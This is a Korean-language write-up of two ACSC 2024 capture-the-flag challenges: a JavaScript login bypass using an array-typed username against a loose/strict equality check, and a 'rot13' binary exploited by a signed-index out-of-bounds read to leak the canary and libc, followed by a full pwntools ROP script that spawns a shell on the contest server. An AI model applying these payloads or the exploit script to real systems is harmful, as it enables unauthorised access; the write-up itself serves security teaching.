---
title: "ACSC CTF 2024 Write up"
date: 2024-04-17 +0900
categories: [WRITE-UP]
tags: ['writeup', 'acsc ctf', '2024']
image:
    path: "/assets/img/posts/acsc_2024_writeup/acsc_logo.png"
    alt: "Asian Cyber Security Challenge 2024"
    lqip: "/assets/img/posts/acsc_2024_writeup/acsc_logo.png"
---

## [Web] - Login!
> **Solver : 189 Solved**<br>
> **Score  : 100pts**

### 1. Abstract

- Strict Equality Operator

### 2. Analysis

- username 과 password를 받음.
- username이 6 byte 이상이면 `Username is to long` 을 출력
- `USER_DB` 에서 `username` 에 해당하는 데이터를 가져옴.
    - ex) `USER_DB['guest']` 이면 user에 `{username: 'guest', password: 'guest'}` 가 저장
- `user` 정보가 존재하고, 입력한 `password` 와 같다면 해당 조건문을 통과한다.
- `username` 이 guest 가 아니면 flag 값을 출력하게 된다.

```python
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (username.length > 6) return res.send('Username is too long');

    const user = USER_DB[username];
    if (user && user.password == password) {
        if (username === 'guest') {
            res.send('Welcome, guest. You do not have permission to view the flag');
        } else {
            res.send(`Welcome, ${username}. Here is your flag: ${FLAG}`);
        }
    } else {
        res.send('Invalid username or password');
    }
});
```

### 3. Exploit

아래와 같이 객체의 인덱스로 문자열 대신 배열을 사용해도 정상적으로 접근할 수 있다. 따라서 첫 번째 조건문인 `if (user && user.password == password)` 을 통과할 수 있다.

![Untitled](/assets/img/posts/acsc_2024_writeup/Untitled.png)

그 다음 조건문은 배열과 문자열을 비교하게 되는데, Strict equality operator(`===`) 로 비교하기 때문에 값 뿐만 아니라 자료형까지 같아야 하므로 해당 조건문은 통과하지 못하게 된다.

따라서 FLAG를 출력해주는 코드를 실행해주게 된다.

#### Exploit Payload

```
username[]=guest&password=guest
```

![Untitled](/assets/img/posts/acsc_2024_writeup/Untitled%201.png)

`ACSC{y3t_an0th3r_l0gin_byp4ss}`

## [Pwn] - rot13
> **Solver : 86 Solved**<br>
> **Score  : 100pts**

### 1. Abstract

- Out Of Bound Read
- Buffer Overflow
- ROP(Return Oriented Programming)

### 2. Analysis

1. 크기가 `0x100` 인 배열 `buf` 가 선언되어 있고 `memset()` 으로 크기 `buf` 크기만큼 0 으로 초기화 시켜준다.
2. `scanf("%[^\n]%*c", buf)` 를 통해 데이터를 입력하고, `scanf`의 반환값이 1 이 아니면 프로그램을 종료한다.
3. 위의 조건문을 통과하면 `rot13` 함수를 호출한다.

```c
int main() {
  const char table[0x100] = ROT13_TABLE;
  char buf[0x100];
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  while (1) {
    printf("Text: ");
    memset(buf, 0, sizeof(buf));
    if (scanf("%[^\n]%*c", buf) != 1)
      return 0;
    rot13(table, buf);
  }
  return 0;
}
```

`rot13()` 함수는 다음과 같이 정의되어 있는데, `buf`의 길이 만큼 for문을 반복하며 `putchar` 를 통해 `table[buf[i]]` 를 출력한다.

```c
void rot13(const char *table, char *buf) {
  printf("Result: ");
  for (size_t i = 0; i < strlen(buf); i++)
    putchar(table[buf[i]]);
  putchar('\n');
}
```

`table` 배열의 데이터는 다음과 같이 저장되어 있다.

```c
#define ROT13_TABLE                                                   \
  "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"  \
  "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"  \
  "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"  \
  "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"  \
  "\x40\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x41\x42"  \
  "\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x5b\x5c\x5d\x5e\x5f"  \
  "\x60\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x61\x62"  \
  "\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x7b\x7c\x7d\x7e\x7f"  \
  "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"  \
  "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"  \
  "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"  \
  "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"  \
  "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"  \
  "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"  \
  "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"  \
  "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

### 3. Exploit

`main()` 함수에서 `scanf` 를 보면 개행문자(`\n`)를 제외 모든 문자를 입력할 수 있으며, 입력값에도 제한이 없어 해당 부분에서 BOF가 일어난다는 것을 알 수 있다.

```c
while (1) {
  printf("Text: ");
  memset(buf, 0, sizeof(buf));
  if (scanf("%[^\n]%*c", buf) != 1)
    return 0;
  rot13(table, buf);
}
```

하지만 해당 바이너리는 모든 mitigation이 설정되어 있는 것을 볼 수 있다.

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

따라서 아래와 같은 시나리오를 세웠다.

1. Memory Leak
    - Canary Leak
    - libc Leak
2. BOF

#### 3.1 Memory Leakage

`rot13()` 에서 `table` 배열은 `buf[i]` 의 값을 인덱스로 받고 있고 `buf` 는 `char` 형으로 선언되었다. 따라서 표현할 수 있는 범위는 -128 ~ 127 이기 때문에 `\x80 ~ \xff` 까지의 데이터는 음수 인식되어 `table` 변수에 대한 Out Of Bound Read가 가능하다.

이를 통해 Canary 값과 libc 주소를 알아냈다.

#### 3.2 Buffer OverFlow

입력 값 제한이 없기 때문에 return address를 덮어쓸 수 있고, `pop; ret;` gadget을 통해 ROP를 이용하여 `system()` 함수를 호출시켰다.

`memset(buf, 0, sizeof(buf));` 이므로 `buf` 배열까지만 초기화가 되고, return을 호출하기 위해서 `scanf` 에 `\n` 을 입력해주면 된다.

#### 3.3 Exploit Code

```python
from pwn import *

#context.log_level = 'debug'

#p = process('./rot13')
p = remote('rot13.chal.2024.ctf.acsc.asia', 9999)

''' Local
putchar_119 = 0x82a77
binsh = 0x1d8698
popret = 0x2a3e5
ret = 0x29cd6
system = 0x50d60
'''
# Server
putchar_119 = 0x829f7
binsh = 0x1d8678
popret = 0x2a3e5
ret = 0x29139
system = 0x50d70

#input()
payload = b''

for i in range(0x0e, 0x100):
    payload += i.to_bytes(1, 'big')

p.sendlineafter(b'Text: ', payload)

p.recvuntil(': ')

p.recvuntil(b'\x7f')
p.recv(8)
leak = u64(p.recv(8))
p.recv(8 * 11)
canary = u64(p.recv(8))

print(hex(leak))
print(hex(canary))

libc_base = leak - putchar_119
ret = libc_base + ret
popret = libc_base + popret
binsh = libc_base + binsh
system = libc_base + system

print(hex(libc_base))

# exploit
payload = b'A' * 0x108
payload += p64(canary)
payload += b'B' * 8
payload += p64(ret)
payload += p64(popret)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'Text: ', payload)

p.sendafter(b'Text: ', b'\n')

p.interactive()
```

`ACSC{aRr4y_1nd3X_sh0uLd_b3_uNs1Gn3d}`